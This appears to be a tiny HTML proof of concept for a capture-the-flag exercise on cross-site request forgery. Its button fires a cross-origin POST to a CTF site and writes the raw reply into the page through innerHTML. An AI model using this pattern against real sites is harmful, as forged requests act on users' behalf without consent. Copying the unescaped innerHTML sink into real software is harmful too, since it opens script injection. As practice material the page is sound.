    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>XSRF</title>
</head>
<body>
    <div style="text-align: center;">
        <h1>Cross Site Request Forgery</h1>
        <button style="width: 200px;" onclick="load()">Load</button>
    </div>

    <hr>
    <div id="httpResponse"></div>
    <hr>

</body>

<script>
    function load()
    {
        // AJAX request from localhost -> ctf website POST method
        let xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://ctf.ezodev.tk/');
        xhr.send();
        xhr.onload = function() {
            document.getElementById('httpResponse').innerHTML = xhr.response
        };
    }
</script>

</html>
